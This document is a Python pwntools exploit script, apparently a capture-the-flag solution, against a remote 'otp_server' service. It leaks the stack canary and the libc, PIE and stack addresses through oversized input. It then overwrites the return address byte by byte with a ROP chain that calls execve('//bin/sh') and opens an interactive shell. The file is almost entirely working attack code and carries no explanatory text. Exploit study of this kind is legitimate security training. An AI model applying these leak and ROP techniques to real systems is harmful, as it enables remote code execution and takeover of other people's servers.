from pwn import *

from time import time

context.bits = 64
context.terminal = ['tmux', 'split-window', '-h']
context.buffer_size = 65536

p = None

def go(aslr=False):
  global p

  p = process("./otp_server")
  if (not aslr):
    gdb.attach(p, gdbscript='''
      break rop_protocol
      #break *0x400c28
      #break *0x400c04
      c 
    ''')
  else:
    gdb.attach(p, gdbscript='''
      c
    ''')
  return


p = remote("52.13.33.174", 2301) #Change host and port
#go(True)

def set_key(value):
  p.readuntil(">>> ")
  p.sendline("1")
  p.readuntil("Enter key:\n")
  p.sendline(value)


def encrypt_message(message):
  p.readuntil(">>> ")
  p.sendline("2")
  p.readuntil("Enter message to encrypt:\n")
  p.send('Q'*256)


def leak_stack():
  set_key("Q"*256)
  encrypt_message("A"*256)

  p.readuntil("----- BEGIN ROP ENCRYPTED MESSAGE -----\n")
  stack = p.readuntil("----- END ROP ENCRYPTED MESSAGE -----\n");

  canary = u64(stack[264:272])
  pie_leak = u64(stack[272:280])
  libc_leak = u64(stack[280:288])
  stack_leak= u64(stack[296:304])

  return stack, canary, libc_leak, pie_leak, stack_leak


def leak_offset_byte(offset):
  set_key("Q"*256)
  encrypt_message("A"*256)

  p.readuntil("----- BEGIN ROP ENCRYPTED MESSAGE -----\n")
  stack = p.readuntil("----- END ROP ENCRYPTED MESSAGE -----\n");

  byte = u8(stack[263 + offset])
  return byte


def write_offset(offset):
  set_key("B" * (offset) + "\x00")
  encrypt_message("A"*256)

  print("written byte: " + hex(leak_offset_byte(offset)))

  return leak_offset_byte(offset)

def write_until_byte_equals(offset, byte):
  current = None

  before = time()
  while current != byte:
    bb = time();
    set_key("B" * (offset) + "\x00")
    encrypt_message("A"*256)

    current = leak_offset_byte(offset)
    print("attempt: " + str(time() - bb))

  print("FINAL: " + str(time() - before))

  return current
  

def dump_indexes(string):
  for i, c in enumerate(string):
    print("index {0}: {1}".format(i, hex(ord(c))))


def write_qword(addr, offset):
  for i in range(7, -1, -1):
    m = (addr & (0xff << (i * 8))) >> (i * 8)
    write_until_byte_equals(offset + i, m)


stack, canary, libc_leak, pie_leak, stack_leak = leak_stack()
libc_base = libc_leak - 0x21b97
elf_base = pie_leak - 0xdd0

print("CANARY LEAK: " + hex(canary))
print("LIBC LEAK: " + hex(libc_leak))
print("PIE LEAK: " + hex(pie_leak))
print("LIBC BASE: " + hex(libc_base))
print("ELF BASE: " + hex(elf_base))
print("STACK LEAK: " + hex(stack_leak))

# Offset to main's ret on the stack
ret_offset = 17

execve = libc_base + 0xe4e30
pop_rdi = 0xe33
pop_rsi = 0xe31

# fake strings and pointers
write_qword(0, ret_offset + 0xc8) 
write_qword(stack_leak - 48, ret_offset + 0xc0) 
write_qword(0, ret_offset + 0xb8) 
write_qword(0x68732f6e69622f2f, ret_offset + 0xb0) 
write_qword(0, ret_offset + 0xa8) 

# rop chain
write_qword(execve, ret_offset + 40) # 
write_qword(0, ret_offset + 32) # 
write_qword(stack_leak - 32, ret_offset + 24) # 
write_qword(elf_base + pop_rsi, ret_offset + 16) #ret
write_qword(stack_leak - 48, ret_offset + 8)  # rdi
write_qword(elf_base + pop_rdi, ret_offset)

# write_qword(elf_base + 0xc7f, ret_offset) # remote puts("") test

_, _, return_addr, _, _ = leak_stack()

print("ret addr: " + hex(return_addr))

p.interactive()
